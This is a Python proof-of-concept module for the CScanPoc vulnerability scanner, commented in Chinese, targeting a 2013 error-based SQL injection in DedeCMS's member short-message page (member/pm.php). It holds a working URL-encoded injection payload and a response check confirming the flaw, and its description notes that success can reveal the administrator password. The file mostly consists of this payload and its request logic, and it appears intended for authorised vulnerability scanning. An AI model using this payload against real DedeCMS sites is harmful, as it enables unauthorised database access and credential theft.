# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0024'  # 平台漏洞编号，留空
    name = 'DedeCMS会员中心短消息SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-01-03'  # 漏洞公布时间
    desc = '''
        需要:magic_quotes_gpc = Off
        DedeCMS会员中心短消息SQL注射漏洞，成功利用此漏洞可获得管理员密码等。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/305/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '552f87cb-d9fa-4628-a44d-b64ee0f1cd4e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/member/pm.php?dopost=read&id=1%27%20and%20@%60%27%60%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28md5(c)%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20%27'
            url = self.target + payload
            r = requests.post(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
